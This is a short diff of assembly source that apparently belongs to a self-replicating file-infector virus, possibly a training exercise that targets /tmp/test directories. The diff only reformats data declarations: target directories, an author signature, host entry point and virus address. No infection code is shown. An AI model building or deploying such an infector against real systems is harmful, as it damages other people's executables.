@@ -392,10 +392,10 @@ section .text
             xor rdi, rdi
             syscall
 
-        dirs db         "/tmp/test",0,"/tmp/test2",0,0
-        Traza_position equ _finish - Traza
-        Traza db         "tomartin & carce-bo",0  ;20
-        hello db            "[+] Hello",10,0  ;11
-        host_entrypoint  dq   _dummy_host_entrypoint
-        virus_vaddr dq   _start
+        dirs            db      "/tmp/test",0,"/tmp/test2",0,0
+        Traza_position  equ     _finish - Traza
+        Traza           db      "tomartin & carce-bo",0  ;20
+        hello           db      "[+] Hello",10,0  ;11
+        host_entrypoint dq      _dummy_host_entrypoint
+        virus_vaddr     dq      _start
     _finish:
